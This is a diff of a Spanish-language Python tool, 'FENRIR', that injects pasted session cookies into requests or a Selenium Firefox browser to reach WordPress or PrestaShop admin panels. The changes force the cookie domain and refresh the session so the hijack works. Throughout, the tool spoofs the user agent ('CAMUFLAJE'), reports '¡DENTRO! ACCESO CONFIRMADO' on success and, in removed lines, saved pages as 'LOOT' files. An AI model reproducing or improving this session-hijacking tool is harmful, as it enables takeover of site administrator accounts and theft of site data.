@@ -18,7 +18,6 @@ SELENIUM_AVAILABLE = False
 try:
     from selenium import webdriver
     from selenium.webdriver.firefox.options import Options as FirefoxOptions
-    from selenium.webdriver.chrome.options import Options as ChromeOptions
     from selenium.webdriver.firefox.service import Service as FirefoxService
     from webdriver_manager.firefox import GeckoDriverManager
     SELENIUM_AVAILABLE = True
@@ -32,7 +31,6 @@ except ImportError:
 logging.basicConfig(level=logging.INFO, format="%(asctime)s %(message)s", datefmt="%H:%M:%S")
 
 class Colors:
-    # AHORA SÍ ESTÁ DEFINIDO EL MAGENTA
     RED, GREEN, YELLOW, CYAN, MAGENTA, RESET, BOLD = "\033[91m", "\033[92m", "\033[93m", "\033[96m", "\033[95m", "\033[0m", "\033[1m"
 
 def colorize(text: str, color: str) -> str: return f"{color}{text}{Colors.RESET}"
@@ -49,7 +47,7 @@ class TargetConfig:
     timeout: int = 20
 
 # ==============================================================================
-#  👻 GHOST BROWSER (UBUNTU SNAP FIX)
+#  👻 GHOST BROWSER (DOMAIN FIX)
 # ==============================================================================
 
 class GhostBrowser:
@@ -59,20 +57,16 @@ class GhostBrowser:
     def launch(self, raw_cookie: str, target_path: str):
         if not SELENIUM_AVAILABLE:
             print(colorize("❌ Error: Selenium no está instalado.", Colors.RED))
-            print("   Ejecuta: pip install selenium webdriver-manager")
             return
 
         print(colorize("\n   👻 Invocando navegador fantasma...", Colors.CYAN))
         
-        # --- FIX CRÍTICO PARA UBUNTU/SNAP ---
-        # Creamos una carpeta temporal local para que el Firefox Snap pueda leerla
+        # --- FIX UBUNTU/SNAP ---
         local_tmp = os.path.join(os.getcwd(), "selenium_temp")
-        if not os.path.exists(local_tmp):
-            os.makedirs(local_tmp)
-        # Forzamos a Python a usar esta carpeta en vez de /tmp/ del sistema
+        if not os.path.exists(local_tmp): os.makedirs(local_tmp)
         os.environ["TMPDIR"] = local_tmp
         
-        # Parseo de cookies
+        # --- PARSEO DE COOKIES ---
         cookies_dict = {}
         try:
             raw_cookie = raw_cookie.strip().replace("Cookie: ", "")
@@ -82,7 +76,7 @@ class GhostBrowser:
                     key, value = part.strip().split("=", 1)
                     cookies_dict[key] = value
         except Exception as e:
-            print(colorize(f"❌ Error parseando cookies: {e}", Colors.RED))
+            print(colorize(f"❌ Error cookies: {e}", Colors.RED))
             return
 
         driver = None
@@ -90,52 +84,64 @@ class GhostBrowser:
             options = FirefoxOptions()
             options.set_preference("general.useragent.override", self.config.user_agent)
             
-            # Anti-bot básico
-            options.set_preference("dom.webdriver.enabled", False)
-            options.set_preference('useAutomationExtension', False)
-            
             print(colorize("   📥 Preparando driver...", Colors.YELLOW))
             service = FirefoxService(GeckoDriverManager().install())
             driver = webdriver.Firefox(service=service, options=options)
             
         except Exception as e:
-            print(colorize(f"   ❌ Error iniciando navegador: {e}", Colors.RED))
-            print("   (Si usas Ubuntu, asegúrate de tener Firefox instalado normalmente)")
+            print(colorize(f"   ❌ Error navegador: {e}", Colors.RED))
             return
 
         try:
-            print("   🌍 Navegando al dominio...")
+            # 1. Extraer el dominio limpio (sin http:// ni www.)
+            url_obj = URL(self.config.base_url)
+            domain = url_obj.host
+            if domain.startswith("www."): domain = domain[4:] # Limpieza extra
+            
+            print(f"   🌍 Navegando a: {colorize(domain, Colors.BOLD)} para inyectar...")
             driver.get(self.config.base_url)
             
-            print(colorize("   💉 Inyectando sesión...", Colors.YELLOW))
+            # 2. Inyectar Cookies CON DOMINIO EXPLÍCITO
+            print(colorize("   💉 Inyectando sesión (Forzando Dominio)...", Colors.YELLOW))
+            
             for name, value in cookies_dict.items():
-                driver.add_cookie({
+                cookie_payload = {
                     'name': name,
                     'value': value,
                     'path': '/',
-                    'secure': True 
-                })
+                    'domain': domain, # <--- ESTA ES LA CLAVE QUE FALTABA
+                    'secure': True
+                }
+                try:
+                    driver.add_cookie(cookie_payload)
+                except Exception as cookie_error:
+                    # Si falla con dominio, intentamos sin él (fallback)
+                    del cookie_payload['domain']
+                    driver.add_cookie(cookie_payload)
+
+            # 3. Recargar para aplicar
+            print("   🔄 Refrescando sesión...")
+            driver.refresh()
+            time.sleep(1) 
             
+            # 4. Ir al objetivo
             final_url = f"{self.config.base_url.rstrip('/')}/{target_path.lstrip('/')}"
             print(f"   🚀 Redirigiendo a: {final_url}")
             driver.get(final_url)
             
-            print(colorize("\n   ✅ NAVEGADOR ABIERTO. La puerta está abierta.", Colors.GREEN))
-            print(colorize("   ⚠️  NOTA: Si ves 'Página no encontrada' pero tienes la barra negra arriba, ¡ESTÁS DENTRO!", Colors.MAGENTA))
-            input("   [Presiona Enter en esta terminal para cerrar el navegador] ")
+            print(colorize("\n   ✅ HECHO. Revisa el navegador.", Colors.GREEN))
+            input("   [Presiona Enter para cerrar] ")
             
         except Exception as e:
-            print(colorize(f"   ❌ Error durante la sesión: {e}", Colors.RED))
+            print(colorize(f"   ❌ Error sesión: {e}", Colors.RED))
         finally:
-            if driver:
-                driver.quit()
-            # Limpieza
+            if driver: driver.quit()
             if os.path.exists(local_tmp):
                 try: shutil.rmtree(local_tmp)
                 except: pass
 
 # ==============================================================================
-#  🦍 FENRIR ENGINE (AIOHTTP CLÁSICO)
+#  🦍 FENRIR ENGINE (AIOHTTP)
 # ==============================================================================
 
 class FenrirEngine:
@@ -165,124 +171,83 @@ class FenrirEngine:
             raw_cookie = raw_cookie.strip().replace("Cookie: ", "")
             parts = raw_cookie.split(";")
             loaded_cookies = []
-
             for part in parts:
                 if "=" in part:
                     key, value = part.strip().split("=", 1)
                     self.session.cookie_jar.update_cookies({key: value}, response_url=url_obj)
                     loaded_cookies.append(key)
-            
             if loaded_cookies:
                 print(colorize(f"✅ Cookies cargadas: {loaded_cookies}", Colors.GREEN))
             else:
-                print(colorize("❌ ERROR: No se detectó formato Nombre=Valor.", Colors.RED))
-
-        except Exception as e:
-            print(colorize(f"❌ Error crítico: {e}", Colors.RED))
+                print(colorize("❌ ERROR: Formato incorrecto.", Colors.RED))
+        except Exception as e: print(colorize(f"❌ Error: {e}", Colors.RED))
 
     async def check_target(self, path: str):
         if not self.session: return
         try:
-            print(f"\n⏳ Atacando objetivo: {colorize(path, Colors.BOLD)} ...")
-            
+            print(f"\n⏳ Verificando: {colorize(path, Colors.BOLD)} ...")
             async with self.session.get(path, allow_redirects=True) as resp:
                 content = await resp.text()
-                title_match = re.search('<title>(.*?)</title>', content, re.IGNORECASE)
-                title = title_match.group(1).strip() if title_match else "Sin Título"
-                
                 real_url = str(resp.url)
-                status = resp.status
                 
-                print(f"   [{status}] URL Final: {real_url}")
-                print(f"   📄 Título: {title[:60]}...")
-
                 is_success = False
-                
-                if self.config.type == TargetType.PRESTASHOP:
-                    if "login" not in real_url.lower() and any(k in content for k in ["logout", "employee_box", "PrestaShop", "Avatar", "class=\"bootstrap\""]):
-                         is_success = True
-                    elif "login" in real_url.lower() and "AdminLogin" not in path:
-                         print(colorize("❌ REBOTE: El servidor te mandó al Login.", Colors.RED))
-
-                elif self.config.type == TargetType.WORDPRESS:
-                    if "wp-login.php" not in real_url and ("wp-admin" in real_url or "wp-admin-bar" in content):
+                if self.config.type == TargetType.WORDPRESS:
+                    # Lógica mejorada de detección
+                    if "wp-login.php" not in real_url and ("wp-admin" in real_url or "wp-admin-bar" in content or "logged-in" in content):
                         is_success = True
-                    elif "wp-login.php" in real_url:
-                         print(colorize("❌ REBOTE: El servidor te mandó al Login.", Colors.RED))
-
+                
                 if is_success:
-                     print(f"\n   {colorize('🔥 ¡DENTRO! ACCESO CONFIRMADO 🔥', Colors.GREEN)}")
-                     filename = f"LOOT_{int(time.time())}.html"
-                     with open(filename, "w", encoding="utf-8") as f: f.write(content)
-                     print(f"   💾 Evidencia guardada en: {filename}")
+                     print(f"   {colorize('🔥 ¡DENTRO! ACCESO CONFIRMADO 🔥', Colors.GREEN)}")
                 else:
-                     if not "REBOTE" in title: 
-                        print(colorize("⚠️  Sin acceso claro (Revisa el HTML).", Colors.YELLOW))
+                     print(colorize("⚠️  Sin acceso claro o rebote al login.", Colors.YELLOW))
 
-        except Exception as e: print(f"❌ Error de conexión: {e}")
+        except Exception as e: print(f"❌ Error conexión: {e}")
 
 # ==============================================================================
-#  🎮 INTERFAZ PRINCIPAL
+#  🎮 MAIN
 # ==============================================================================
 
 async def main():
-    print(colorize("\n🦍 FENRIR v3.9 - UBUNTU EDITION 🦍\n", Colors.RED))
+    print(colorize("\n🦍 FENRIR v4.0 - PRECISION COOKIE 🦍\n", Colors.RED))
 
     # 1. URL
-    url_input = input(">> URL Base (Raíz): ").strip()
+    url_input = input(">> URL Base: ").strip()
     if not url_input.startswith("http"): url_input = f"http://{url_input}"
     if not url_input.endswith("/"): url_input += "/"
     
-    # 2. TECNOLOGÍA
-    print("\n[1] WordPress")
-    print("[2] PrestaShop")
+    # 2. CMS
+    print("\n[1] WordPress\n[2] PrestaShop")
     choice = input(">> Opción: ").strip()
     target_type = TargetType.WORDPRESS if choice == '1' else TargetType.PRESTASHOP
 
     # 3. COOKIE
-    final_cookie_string = ""
-    print(f"\n{Colors.YELLOW}👉 INYECCIÓN DE COOKIES{Colors.RESET}")
-    
-    if target_type == TargetType.PRESTASHOP:
-        print("   [1] PHPSESSID:")
-        phpsessid = input("   >> ").strip()
-        print("   [2] PrestaShop Cookie:")
-        auth = input("   >> ").strip()
-        prefix = f"PHPSESSID={phpsessid}" if "=" not in phpsessid else phpsessid
-        final_cookie_string = f"{prefix}; {auth}"
-    else: 
-        print("   Pega la cookie completa:")
-        final_cookie_string = input("   >> ").strip()
+    print(f"\n{Colors.YELLOW}👉 COOKIE{Colors.RESET}")
+    final_cookie_string = input("   >> Pega la cookie completa: ").strip()
 
-    # 4. USER AGENT
+    # 4. UA
     print(f"\n{Colors.CYAN}🎭 CAMUFLAJE{Colors.RESET}")
-    print("   [Enter] para Firefox Linux.")
+    print("   [Enter] para Firefox Linux (Recomendado poner tu UA real si falla).")
     ua_input = input(">> User-Agent: ").strip()
     if not ua_input: ua_input = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
 
     # 5. RUTA
     print(f"\n{Colors.GREEN}🎯 OBJETIVO{Colors.RESET}")
-    default_path = "/Backoffice" if target_type == TargetType.PRESTASHOP else "/wp-admin/"
-    print(f"   [Enter] para: {default_path}")
-    path_input = input(">> Ruta: ").strip()
+    default_path = "/wp-admin/"
+    path_input = input(f"   >> Ruta (Enter para {default_path}): ").strip()
     if not path_input: path_input = default_path
-    
-    # Fix para rutas relativas
-    if path_input.startswith("http"):
-        path_input = URL(path_input).path
+    if path_input.startswith("http"): path_input = URL(path_input).path
     if not path_input.startswith("/"): path_input = f"/{path_input}"
 
-    # 6. MODO DE EJECUCIÓN
-    print(f"\n{Colors.MAGENTA}⚔️  MODO DE ATAQUE{Colors.RESET}")
-    print("   [1] Check Rápido (Consola)")
-    print("   [2] Abrir Navegador (Selenium)")
+    # 6. MODO
+    print(f"\n{Colors.MAGENTA}⚔️  MODO{Colors.RESET}")
+    print("   [1] Check Rápido (Tu código original)")
+    print("   [2] Abrir Navegador (Selenium con Fix)")
     mode = input("   >> ").strip()
 
     config = TargetConfig(base_url=url_input, type=target_type, user_agent=ua_input)
 
     if mode == '2':
-        ghost = GhostBrowser(config)
-        ghost.launch(final_cookie_string, path_input)
+        GhostBrowser(config).launch(final_cookie_string, path_input)
     else:
         async with FenrirEngine(config) as engine:
             engine.inject_raw_cookie(final_cookie_string)
@@ -290,7 +255,5 @@ async def main():
 
 if __name__ == "__main__":
     if sys.platform == 'win32': asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
-    try:
-        asyncio.run(main())
-    except KeyboardInterrupt:
-        pass
+    try: asyncio.run(main())
+    except KeyboardInterrupt: pass
